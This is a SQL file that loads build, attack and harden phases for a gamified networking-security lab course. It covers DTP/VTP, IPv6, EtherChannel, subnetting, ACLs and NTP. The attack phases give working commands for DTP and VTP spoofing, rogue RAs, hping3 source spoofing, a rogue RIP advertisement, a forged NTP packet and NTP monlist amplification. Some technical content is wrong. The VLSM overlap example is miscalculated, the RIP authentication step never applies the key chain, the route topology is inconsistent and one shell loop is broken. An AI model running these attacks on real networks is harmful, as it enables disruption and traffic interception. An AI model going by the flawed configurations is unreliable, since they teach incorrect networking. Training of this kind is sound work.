<b>Attack 1 — Neighbour discovery scan:</b> <code>nmap -6 -e eth0 2001:db8:1::/64 -sn</code>. <b>Attack 2 — EUI-64 prediction:</b> Given a MAC, compute the IPv6 address: MAC aa:bb:cc:11:22:33 → EUI-64 aabb:ccff:fe11:2233 → IPv6 2001:db8:1::aabb:ccff:fe11:2233. <b>Attack 3 — Rogue RA:</b> Kali sends a Router Advertisement with a different prefix: <code>radvd</code> or Scapy. Hosts autoconfigure an additional IP on the rogue prefix — all traffic for that prefix goes through Kali.
<div class="achievement"><span class="medal">📡</span><span class="txt">Achievement: IPv6 Hunter</span></div>
', is_pro_only=TRUE
WHERE lab_id=28 AND phase='attack';
UPDATE lab_phases SET title='Sabotage the Link', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Break the interface through misconfiguration</h3><p>Interface attacks: (1) duplex mismatch — force half-duplex on one side while the other is full-duplex, causing collisions and packet loss, (2) DTP spoofing — negotiate the port into trunk mode from an attacker''s device to receive all VLAN traffic, (3) port flapping — rapidly toggle the port to trigger STP reconvergence.</p></div>

<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ Duplex mismatch · DTP spoof · Port flap · interface errors</span></div>

## Attack 1 — Duplex mismatch

From Kali, force half-duplex:
```
sudo ethtool -s eth0 duplex half
```

R1 (or SW1) is still full-duplex. The mismatch causes:
- Late collisions on the half-duplex side
- CRC errors on the full-duplex side
- Severe packet loss (50%+)

Check on R1:
```
show interfaces gi0/0
```

The output shows `1000Mb/s, Half-duplex` and rising error counters:
- `runts`, `giants`, `CRC`, `frame` on the full side
- `late collisions`, `excessive collisions` on the half side

## Attack 2 — DTP spoof (VLAN hopping)

Kali sends a DTP frame requesting trunk mode:
```
sudo yersinia dtp -attack 1 -interface eth0
```

If the switch port is configured as `dynamic desirable` or `dynamic auto`, it converts to trunk mode. Kali now receives traffic from ALL VLANs.

Check on SW1:
```
show interfaces gi0/3 trunk
```

If successful, Gi0/3 shows up as a trunk carrying all active VLANs.

<div class="callout warn"><p><strong>DTP is ON by default</strong> on Cisco switches. Every access port left in dynamic mode is a potential trunk negotiation target. Always set <code>switchport mode access</code> explicitly.</p></div>

## Attack 3 — Port flapping (DoS)

Toggle Kali''s interface rapidly:
```
for i in $(seq 1 100); do
  sudo ip link set eth0 down && sleep 0.5 && sudo ip link set eth0 up && sleep 0.5
done
```

On SW1:
```
show logging | include Link
```

Each link state transition generates a log message and triggers STP recalculation. Too many flaps can spike the switch CPU.

<div class="achievement"><span class="medal">🔌</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Interface Saboteur — you broke the link three ways</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=20 AND phase='attack';
UPDATE lab_phases SET title='Harden Interface Configs', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Lock every port down</h3><p>Interface hardening: set all ports explicitly to access or trunk (disable DTP dynamically), hardcode duplex and speed on critical links, enable errdisable recovery, storm-control for broadcast storms.</p></div>

<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ Explicit mode · storm-control · errdisable · CDP/LLDP</span></div>

## Step 1 — Hardcode interface mode

On SW1, every port must be explicitly configured:
```
configure terminal
interface range gi0/1 - 3
 switchport mode access
 switchport nonegotiate          ! Don''t send DTP frames
!
interface gi0/24
 switchport mode trunk
 switchport nonegotiate
end
```

`switchport nonegotiate` stops DTP frames entirely — no trunk negotiation, period.

## Step 2 — Storm-control

```
configure terminal
interface gi0/24
 storm-control broadcast level 50
 storm-control multicast level 70
 storm-control action shutdown
end
```

If broadcast/multicast traffic exceeds these thresholds, the port shuts down instead of forwarding the storm.

## Step 3 — Hardcode speed/duplex on trunks

```
configure terminal
interface gi0/24
 speed 1000
 duplex full
end
```

No negotiation, no mismatch.

## Step 4 — Verify

```
show interfaces status
show interfaces trunk
show storm-control
show interfaces gi0/24 | include negotiations
```

The DTP attack no longer works (nonegotiate). The duplex mismatch is impossible (both sides hardcoded). Port flaps are logged but STP stabilises quickly.

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Interface Warden — every port is explicit, hardened, and monitored</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=20 AND phase='harden';
UPDATE lab_phases SET title='Build a Routed Network', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Connect two subnets through a router</h3><p>Routing is how a packet travels from one network to another. A router examines the destination IP, looks up its routing table, and forwards the packet to the next hop. Without routing, devices on different subnets can never communicate. In this lab you build a two-router network with static routes — the foundation of every routing table.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ Static route · default route · next hop · routing table</span></div>

## The topology

| Device | LAN | Connection |
|---|---|---|
| R1 | 192.168.1.0/24 (Gi0/0) | 10.0.0.0/30 (Gi0/1) → R2 |
| R2 | 192.168.2.0/24 (Gi0/0) | 10.0.0.4/30 (Gi0/1) → R3 |
| R3 | 192.168.3.0/24 (Gi0/0) | 10.0.0.8/30 (Gi0/1) → R1 |
| PC1 → R1, PC2 → R2, PC3 → R3 | | |

## Objectives

<ul class="tool-objectives">
<li>Configure static routes to reach remote subnets</li>
<li>Verify the routing table on each router</li>
<li>Test end-to-end connectivity across all three networks</li>
</ul>

## Step 1 — Interface config

On R1:
```
configure terminal
interface gi0/0
 ip address 192.168.1.1 255.255.255.0
 no shutdown
interface gi0/1
 ip address 10.0.0.1 255.255.255.252
 no shutdown
end
```

On R2:
```
interface gi0/0
 ip address 192.168.2.1 255.255.255.0
 no shutdown
interface gi0/1
 ip address 10.0.0.5 255.255.255.252
 no shutdown
end
```

On R3:
```
interface gi0/0
 ip address 192.168.3.1 255.255.255.0
 no shutdown
interface gi0/1
 ip address 10.0.0.10 255.255.255.252
 no shutdown
end
```

## Step 2 — Static routes

On R1 (needs routes to 192.168.2.0/24 and 192.168.3.0/24):
```
configure terminal
ip route 192.168.2.0 255.255.255.0 10.0.0.2
ip route 192.168.3.0 255.255.255.0 10.0.0.2
end
```

On R2:
```
configure terminal
ip route 192.168.1.0 255.255.255.0 10.0.0.1
ip route 192.168.3.0 255.255.255.0 10.0.0.6
end
```

On R3:
```
configure terminal
ip route 192.168.1.0 255.255.255.0 10.0.0.9
ip route 192.168.2.0 255.255.255.0 10.0.0.9
end
```

## Step 3 — Verify

On each router:
```
show ip route
show ip route 192.168.3.0
```

From PC1 (192.168.1.10):
```
ping 192.168.3.10
```

The ping crosses two routers and three subnets. Each router made a forwarding decision based on its routing table.

<div class="callout info"><p><strong>Routing principle:</strong> Every router must know how to reach every subnet, OR have a default route (0.0.0.0/0) pointing to a gateway that does. If even one router misses a route, return traffic is dropped — and the ping fails.</p></div>

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Route Planner — three subnets, three static routes, full connectivity</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=21 AND phase='build';
UPDATE lab_phases SET title='Plan Fixed-Length Subnets', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Slice a /24 into equal-sized subnets</h3><p>Fixed-Length Subnet Masking (FLSM) divides a network into equal-sized blocks. If you need 4 subnets from 192.168.1.0/24, each gets 64 addresses (62 usable). Every subnet uses the same mask (/26). This is the simplest subnetting scheme — and the most wasteful when subnets have different size requirements.</p></div>

<div class="stats"><span class="chip xp">✦ 300 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ FLSM · subnet mask · CIDR · network/broadcast · usable hosts</span></div>

## The topology

| Subnet | Requirement | Network | Hosts |
|---|---|---|---|
| LAN A | 30 devices | 192.168.1.0/27 | 30 usable |
| LAN B | 30 devices | 192.168.1.32/27 | 30 usable |
| WAN 1 | 2 devices (R1↔R2) | 192.168.1.64/30 | 2 usable |
| WAN 2 | 2 devices (R2↔R3) | 192.168.1.68/30 | 2 usable |

Total: 4 subnets from 192.168.1.0/24, FLSM with /27 for LANs and /30 for WANs.

## Objectives

<ul class="tool-objectives">
<li>Calculate subnet boundaries, broadcast addresses, and usable ranges</li>
<li>Configure devices with the planned addressing</li>
<li>Verify end-to-end connectivity across the FLSM scheme</li>
</ul>

## Step 1 — Calculate subnets (on paper)

Starting network: 192.168.1.0/24 (mask 255.255.255.0)

For a /27 subnet (255.255.255.224):
- 3 bits borrowed, 5 bits for hosts = 2⁵ - 2 = 30 usable addresses
- Block size: 32 addresses per subnet
- First usable: network + 1, Last usable: broadcast - 1

| Subnet | Network | First | Last | Broadcast |
|---|---|---|---|---|
| LAN A | 192.168.1.0/27 | .1 | .30 | .31 |
| LAN B | 192.168.1.32/27 | .33 | .62 | .63 |

For a /30 subnet (4 addresses, 2 usable):
| WAN 1 | 192.168.1.64/30 | .65 | .66 | .67 |
| WAN 2 | 192.168.1.68/30 | .69 | .70 | .71 |

## Step 2 — Configure

On R1 (LAN A gateway + WAN):
```
interface gi0/0
 ip address 192.168.1.1 255.255.255.224
interface gi0/1
 ip address 192.168.1.65 255.255.255.252
```

On PC1 (LAN A):
```
ip 192.168.1.10 255.255.255.224 192.168.1.1
```

On R2:
```
interface gi0/0
 ip address 192.168.1.33 255.255.255.224
interface gi0/1
 ip address 192.168.1.66 255.255.255.252
interface gi0/2
 ip address 192.168.1.69 255.255.255.252
```

## Step 3 — Verify

```
ping 192.168.1.33        ! R2 LAN interface from PC1
ping 192.168.1.10        ! PC1 from PC2 (LAN B)
```

<div class="callout tip"><p><strong>Shortcut:</strong> Each /27 block is 32 addresses. Each /30 block is 4. Count multiples: 0, 32, 64, 68, 72... Never overlap.</p></div>

<div class="achievement"><span class="medal">🏗️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Subnet Slicer — you carved equal pieces from a /24 with surgical precision</span></span></div>
', is_pro_only=FALSE
WHERE lab_id=22 AND phase='build';
UPDATE lab_phases SET title='RA Guard and IPv6 First Hop', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Block rogue RAs at the switch</h3><p>RA Guard drops RAs from untrusted ports. IPv6 First Hop Security (FHS) bundle prevents all NDP-based attacks.</p></div>
<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ RA Guard · FHS · DHCPv6 guard</span></div>
<b>Step 1</b> — RA Guard policy: <code>ipv6 nd raguard policy BLOCK_ROGUE</code> → <code>device-role host</code> → attach to Kali''s port: <code>int gi0/3</code> → <code>ipv6 nd raguard attach-policy BLOCK_ROGUE</code>. <b>Step 2</b> — DHCPv6 Guard: <code>ipv6 dhcp guard policy BLOCK_DHCP</code> → <code>device-role client</code> → attach. <b>Step 3</b> — Re-run attack: rogue RAs are dropped at the switch port.
<div class="achievement"><span class="medal">🛡️</span><span class="txt">Achievement: IPv6 Warden</span></div>
', is_pro_only=TRUE
WHERE lab_id=28 AND phase='harden';
UPDATE lab_phases SET title='Break the Subnet Boundaries', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Misconfig that breaks routing</h3><p>Common FLSM mistakes: overlapping subnets, wrong mask (too big or too small), wrong gateway assignment. In this lab, we deliberately deploy overlapping subnets and watch traffic disappear.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ Overlapping subnets · wrong mask · unreachable</span></div>

## Attack 1 — Overlapping subnets

Configure R2 with a route that overlaps with LAN A:
```
configure terminal
interface gi0/0
 ip address 192.168.1.20 255.255.255.224  ! Same /27 as LAN A — OVERLAP!
end
```

R2 now has an IP on the same subnet as LAN A, connected to a DIFFERENT interface. The routing table gets confused — traffic to 192.168.1.10 might go to R1 or R2.

## Attack 2 — Wrong mask

Configure PC2 with /24 instead of /27:
```
ip 192.168.1.40 255.255.255.0 192.168.1.33
```

PC2 thinks it can reach 192.168.1.10 (LAN A) directly — it doesn''t need a router. It sends ARP for .10, which nobody answers. The ping fails silently.

## Attack 3 — Wrong gateway

Configure PC3 with the wrong default gateway:
```
ip 192.168.1.90 255.255.255.252 192.168.1.1
```

PC3''s gateway (192.168.1.1) is not on the same subnet as PC3 (192.168.1.90/30''s subnet is 192.168.1.88–91, and .1 is in .0/27). PC3 sends ARP for .1 and gets no reply.

<div class="callout warn"><p>Every subnetting mistake above is a real outage I''ve seen in production. Overlapping subnets are the most dangerous — they cause intermittent, hard-to-diagnose failures.</p></div>

<div class="achievement"><span class="medal">💥</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Subnet Saboteur — you broke reachability with one wrong mask</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=22 AND phase='attack';
UPDATE lab_phases SET title='Subnet Scheme Verification', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Verify every subnet boundary is correct</h3><p>FLSM hardening: use a subnet calculator to double-check every boundary, document the scheme, set up monitoring for overlapping subnets, and implement IPAM.</p></div>

<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ Subnet audit · IPAM · documentation</span></div>

## Step 1 — Audit the scheme

Check every subnet allocation against the plan:
```
show ip interface brief | include 192.168.1
```

Every IP should fall within its planned range. Any IP outside its range = misconfiguration.

## Step 2 — Test boundaries

From each subnet, test the first and last usable address:
```
ping 192.168.1.1     ! First usable, LAN A
ping 192.168.1.30    ! Last usable, LAN A
ping 192.168.1.31    ! Broadcast — should FAIL
```

The broadcast address MUST fail. If it responds, the mask is wrong.

## Step 3 — Document

Save the subnet plan:
```
show running-config | include ip address
```

Cross-reference with your paper plan. Every mismatch is a ticket.

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">Subnet Auditor — every boundary verified, no overlaps</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=22 AND phase='harden';
UPDATE lab_phases SET title='Exploit VLSM Misconfigs', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Break summarisation and the VLSM hierarchy</h3><p>VLSM attacks: (1) route summarisation that includes a subnet you don''t own (traffic hijack), (2) VLSM overlap through a misordered allocation, (3) subnet squatting — configuring a device with an IP from an unallocated range to avoid detection.</p></div>

<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ Summary hijack · VLSM overlap · subnet squatting</span></div>

## Attack 1 — Summary hijack

An attacker advertises 192.168.1.0/24 (the supernet of all your VLSM subnets) from a rogue router. Other routers prefer the /24 (more specific than default, same length as the origin) — traffic to any 192.168.1.x is redirected.

If using RIPv2 or OSPF, the rogue route poisons the entire 192.168.1.0/24 range from Kali''s router:
```
! On Kali (Quagga/FRR running RIP)
ip route 192.168.1.0 255.255.255.0 null0
router rip
 network 192.168.1.0
 default-information originate
```

## Attack 2 — VLSM overlap

Configure LAN C with a /27 instead of /28:
```
! On R3, LAN C interface
interface gi0/0
 ip address 192.168.1.97 255.255.255.224   ! /27 — overlaps with LAN B!
end
```

192.168.1.97/27 spans 192.168.1.64–95/27 (LAN B), plus 192.168.1.96–127 (planned LAN C). Traffic to 192.168.1.66 (PC2) might hit R3 instead of R2.

## Attack 3 — Subnet squatting

An attacker assigns Kali an IP from an unallocated range within the /24:
```
sudo ip addr add 192.168.1.200/28 dev eth0
```

No one monitors this range — it''s between LAN C and WAN 1. The attacker can send/receive traffic on an address that doesn''t appear in any official subnet plan.

```
sudo tcpdump -i eth0 -nn
```

<div class="achievement"><span class="medal">🎭</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">VLSM Ghost — you lived in a subnet nobody allocated</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=23 AND phase='attack';
UPDATE lab_phases SET title='VLSM Verification and Auditing', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Audit the VLSM plan for gaps and overlaps</h3><p>VLSM hardening: document every allocated range, use IPAM software, monitor for unexpected IPs on the network, implement uRPF to prevent subnet-squatting traffic from leaving the subnet.</p></div>

<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ IP audit · VLSM verification · documentation</span></div>

## Step 1 — Scan for overlaps

From Kali, scan the entire /24:
```
nmap -sL 192.168.1.0/24 | grep "192.168.1" | wc -l
```

Compare live hosts to the VLSM plan. Any host in an unallocated range = rogue device.

## Step 2 — Verify summarisation

```
show ip route 192.168.1.0 255.255.255.0 longer-prefixes
```

Check that the summary route (192.168.1.0/25) covers all subnets. If any subnet falls outside /25, the summary is wrong.

## Step 3 — Document

Create the final VLSM table:

```
Network         Mask            Range               Use
192.168.1.0/26  255.255.255.192   .1–.62             LAN A
192.168.1.64/27 255.255.255.224   .65–.94            LAN B
192.168.1.96/28 255.255.255.240   .97–.110           LAN C
192.168.1.112/30 255.255.255.252  .113–.114          WAN 1
192.168.1.116/30 255.255.255.252  .117–.118          WAN 2
Unallocated: .119–.255 (137 addresses for growth)
```

<div class="achievement"><span class="medal">🛡️</span><span class="txt"><span class="lbl">Achievement Unlocked</span><span class="name">VLSM Guardian — every address accounted for, no space squatters</span></span></div>
', is_pro_only=TRUE
WHERE lab_id=23 AND phase='harden';
UPDATE lab_phases SET title='Protect TCP/UDP', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>TCP intercept, rate-limit, and stateful firewall</h3><p>TCP intercept proxies the handshake. Rate-limit protects against UDP floods. Stateful firewall tracks connection state.</p></div>
<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ TCP intercept · rate-limit · stateful filtering</span></div>
<b>Step 1</b> — TCP intercept: <code>ip tcp intercept list 10</code> → <code>access-list 10 permit tcp any host 192.168.1.200 eq 80</code> → <code>int gi0/0</code> → <code>ip tcp intercept mode intercept</code>. R1 completes the handshake with the client, then opens a second connection to the server. SYN flood never reaches PC2. <b>Step 2</b> — UDP rate-limit: <code>access-list 101 permit udp any host 192.168.1.200</code> → <code>class-map UDP</code> → <code>policy-map LIMIT</code> → <code>police 1000000 20000 exceed-action drop</code>.
<div class="achievement"><span class="medal">🛡️</span><span class="txt">Achievement: Transport Guardian</span></div>
', is_pro_only=TRUE
WHERE lab_id=29 AND phase='harden';
UPDATE lab_phases SET title='VTP Poisoning & DTP Hijack', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Poison the VTP domain and trunk the attacker</h3><p>VTP has no authentication by default. An attacker who connects a switch with a higher revision number and a different VLAN database wipes or corrupts the entire domain. DTP lets any port become a trunk if the other side asks nicely.</p></div>
<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ VTP poisoning · revision number · DTP spoof · VLAN hopping</span></div>
<b>Attack 1 — VTP poisoning:</b> From Kali (or a GNS3 switch), set a VTP revision higher than the server: <code>vtp domain NETBREAKER</code>, <code>vtp password anything</code>, delete all VLANs, then send a VTP advertisement. The entire VTP domain loses all VLANs — every switch drops its VLAN database. <code>show vlan brief</code> shows only VLAN 1.
<br/><b>Attack 2 — DTP trunk hijack:</b> Kali sends DTP frames to negotiate trunk mode: <code>yersinia dtp -attack 1</code>. If the port is in dynamic desirable/auto, it becomes a trunk. Kali now receives traffic from ALL VLANs. <code>tcpdump -i eth0 -nn</code> shows frames from VLANs 10, 20, etc.
<br/><b>Attack 3 — Double tagging (VLAN hopping):</b> Send a frame with two 802.1Q tags: outer = native VLAN (1), inner = target VLAN (10). The first switch strips the outer tag and forwards the frame to VLAN 10. PC1 in VLAN 10 receives traffic from Kali even though Kali is not in VLAN 10.
<div class="achievement"><span class="medal">⚔️</span><span class="txt">Achievement: VTP Poisoner</span></div>
', is_pro_only=TRUE
WHERE lab_id=24 AND phase='attack';
UPDATE lab_phases SET title='Kill DTP and VTP', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Disable both protocols on user-facing ports</h3><p>VTP should be off or in transparent mode. DTP should be disabled with <code>switchport nonegotiate</code>. User-facing ports must be explicitly set to <code>switchport mode access</code>.</p></div>
<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~10 min</span><span class="chip loot">⬡ VTP off · nonegotiate · access mode</span></div>
<b>Step 1</b> — Disable VTP: <code>vtp mode transparent</code> on all switches. VTP never alters the VLAN database again.
<br/><b>Step 2</b> — Disable DTP on access ports: <code>int range gi0/1-3</code> → <code>switchport mode access</code> → <code>switchport nonegotiate</code>. No trunk negotiation, period.
<br/><b>Step 3</b> — Set the native VLAN to an unused VLAN: <code>vlan 999</code> → <code>name DEAD</code>, then on trunk: <code>switchport trunk native vlan 999</code>. Double-tagging attacks fail because the native VLAN (1) doesn''t exist on the trunk.
<div class="achievement"><span class="medal">🛡️</span><span class="txt">Achievement: Trunk Guardian</span></div>
', is_pro_only=TRUE
WHERE lab_id=24 AND phase='harden';
UPDATE lab_phases SET title='Build a Link Bundle', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Bundle two links into one logical pipe</h3><p>EtherChannel aggregates multiple physical links into one logical link with STP treating them as a single port. Load balancing distributes traffic across the bundle.</p></div>
<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ EtherChannel · LACP · PAgP · load-balancing</span></div>
<b>Topology:</b> SW1↔SW2 with 2 links (Gi0/23–24). <b>Step 1</b> — LACP mode: <code>int range gi0/23-24</code> → <code>channel-group 1 mode active</code> → <code>interface port-channel 1</code> → <code>switchport mode trunk</code>. <b>Step 2</b> — Verify: <code>show etherchannel summary</code> shows Po1 in SU (in use). <b>Step 3</b> — Test: unplug one link — no STP reconvergence, no packet loss.
<div class="achievement"><span class="medal">🏗️</span><span class="txt">Achievement: Channel Master</span></div>
', is_pro_only=FALSE
WHERE lab_id=26 AND phase='build';
UPDATE lab_phases SET title='Break the Bundle', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Misconfiguration that dissolves the bundle</h3><p>EtherChannel requires matching config on all member ports (same VLAN, same trunk mode, same speed/duplex). A mismatch dissolves the bundle and traffic falls to single links.</p></div>
<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ Mismatch · bundle dissolve · LACP flap</span></div>
<b>Attack 1 — VLAN mismatch:</b> Configure Gi0/24 with different allowed VLANs: <code>int gi0/24</code> → <code>switchport trunk allowed vlan 10</code>. The port is removed from the bundle. <code>show etherchannel 1 port-channel</code> shows only Gi0/23. <b>Attack 2 — LACP flapping:</b> Cycle LACP mode rapidly: <code>for i in seq 1 20; do channel-group 1 mode passive; sleep 1; channel-group 1 mode active; done</code>. The bundle flutters, causing intermittent connectivity. <b>Attack 3 — LACP spoof:</b> From Kali, send forged LACP packets with a different system priority, tricking a switch into forming a bundle with the attacker.
<div class="achievement"><span class="medal">🔗</span><span class="txt">Achievement: Channel Breaker</span></div>
', is_pro_only=TRUE
WHERE lab_id=26 AND phase='attack';
UPDATE lab_phases SET title='Harden EtherChannel', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Mismatch detection and consistent config</h3><p>Use <code>channel-group</code> consistent config validation, <code>lacp rate fast</code> for faster failure detection, and verify both sides match.</p></div>
<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~10 min</span><span class="chip loot">⬡ LACP fast-rate · config consistency</span></div>
<b>Step 1</b> — Fast LACP heartbeats: <code>int port-channel 1</code> → <code>lacp rate fast</code> (sends every 1s instead of 30s). <b>Step 2</b> — Verify bundle: <code>show etherchannel port-channel</code> shows Po1 with 2 ports bundled. <b>Step 3</b> — Load balance: <code>port-channel load-balance src-dst-ip</code>.
<div class="achievement"><span class="medal">🛡️</span><span class="txt">Achievement: Channel Guardian</span></div>
', is_pro_only=TRUE
WHERE lab_id=26 AND phase='harden';
UPDATE lab_phases SET title='Authenticate RIP', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>MD5 authentication and passive interfaces</h3><p>RIPv2 supports MD5 authentication. With a matching key on all routers, fake RIP updates are ignored.</p></div>
<div class="stats"><span class="chip xp">✦ 200 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~10 min</span><span class="chip loot">⬡ RIP auth · passive-interface</span></div>
<b>Step 1</b> — Key chain: <code>key chain NETBREAKER</code> → <code>key 1</code> → <code>key-string NetBreakerKey</code>. <b>Step 2</b> — Apply to RIP: <code>router rip</code> → <code>timers basic 30 90 60</code> → <code>validate-update-source</code>. <b>Step 3</b> — Passive interfaces: <code>passive-interface gi0/0</code> (LAN side doesn''t need RIP). <b>Step 4</b> — Re-run attack: Kali''s RIP updates are dropped.
<div class="achievement"><span class="medal">🛡️</span><span class="txt">Achievement: Dynamic Guardian</span></div>
', is_pro_only=TRUE
WHERE lab_id=27 AND phase='harden';
UPDATE lab_phases SET title='Standard ACL Weaknesses', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Spoof past the ACL</h3><p>Standard ACLs only check source IP — spoof the source and you''re through. They also can''t filter by port.</p></div>
<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~20 min</span><span class="chip loot">⬡ IP spoof · ACL bypass · no port filtering</span></div>
<b>Attack 1 — IP spoof:</b> Kali sends packets with a permitted source IP: <code>sudo hping3 -S -a 192.168.1.100 -p 23 192.168.2.100</code>. The ACL allows because source IP is in the permit list. <b>Attack 2 — No port specificity:</b> The ACL can''t block Telnet while allowing HTTP — it permits or denies ALL traffic from the source network. <b>Attack 3 — ACL order:</b> If the deny statement comes before the permit, everyone is blocked. Test by reversing order: <code>no access-list 10</code> → recreate with deny first.
<div class="achievement"><span class="medal">🎭</span><span class="txt">Achievement: ACL Ghost</span></div>
', is_pro_only=TRUE
WHERE lab_id=30 AND phase='attack';
UPDATE lab_phases SET title='Extended ACLs', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Extended ACLs fix everything standard ACLs miss</h3><p>Extended ACLs (100–199) filter on source + destination + protocol + port. Plus uRPF for spoof protection.</p></div>
<div class="stats"><span class="chip xp">✦ 250 XP</span><span class="chip diff">◆ Beginner</span><span class="chip time">◷ ~15 min</span><span class="chip loot">⬡ Extended ACL · uRPF · port filtering</span></div>
<b>Step 1</b> — Extended ACL: <code>ip access-list extended BLOCK_TELNET</code> → <code>deny tcp 172.16.0.0 0.0.255.255 host 192.168.2.100 eq 23</code> → <code>permit ip any any</code>. <b>Step 2</b> — Apply inbound on gi0/0: <code>int gi0/0</code> → <code>ip access-group BLOCK_TELNET in</code>. <b>Step 3</b> — uRPF: <code>int gi0/0</code> → <code>ip verify unicast source reachable-via rx</code>. Spoofed packets are dropped before they reach the ACL.
<div class="achievement"><span class="medal">🛡️</span><span class="txt">Achievement: ACL Architect</span></div>
', is_pro_only=TRUE
WHERE lab_id=30 AND phase='harden';
UPDATE lab_phases SET title='Forge the Time', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Shift time to invalidate logs and certs</h3><p>NTP has no authentication by default (NTPv3). An attacker can send forged NTP packets to shift device time — invalidating certificate timestamps, confusing logs, and disrupting authentication protocols.</p></div>
<div class="stats"><span class="chip xp">✦ 400 XP</span><span class="chip diff">◆ Advanced</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ NTP spoof · time shift · log poisoning · DoS</span></div>
<b>Attack 1 — NTP spoof:</b> Kali sends a forged NTP response claiming to be stratum 1: <code>sudo ntpq -c rv 192.168.1.1</code> then craft using Scapy: <code>send(IP(src="pool.ntp.org")/UDP(sport=123)/NTP(..., stratum=1, ref_timestamp=...))</code>. <b>Attack 2 — NTP amplification:</b> Use the router as an amplifier for DDoS: <code>ntpdc -c monlist 192.168.1.1</code> returns 600 responses for one request. <b>Attack 3 — Time skew:</b> Repeatedly send NTP responses with slightly shifted time (+5s, -10s) — certificates fail, logs misalign, Kerberos breaks.
<div class="achievement"><span class="medal">⏰</span><span class="txt">Achievement: Time Thief</span></div>
', is_pro_only=TRUE
WHERE lab_id=31 AND phase='attack';
UPDATE lab_phases SET title='SNMP Recon and Config Theft', content='
<div class="mission"><span class="tag">◈ MISSION</span><h3>Read the config via public community</h3><p>If the public community string is enabled with read access, an attacker can dump the full config. If private is enabled with write (default in many older devices), the attacker can change the config.</p></div>
<div class="stats"><span class="chip xp">✦ 500 XP</span><span class="chip diff">◆ Intermediate</span><span class="chip time">◷ ~25 min</span><span class="chip loot">⬡ SNMP recon · config theft · SNMP write · community brute</span></div>
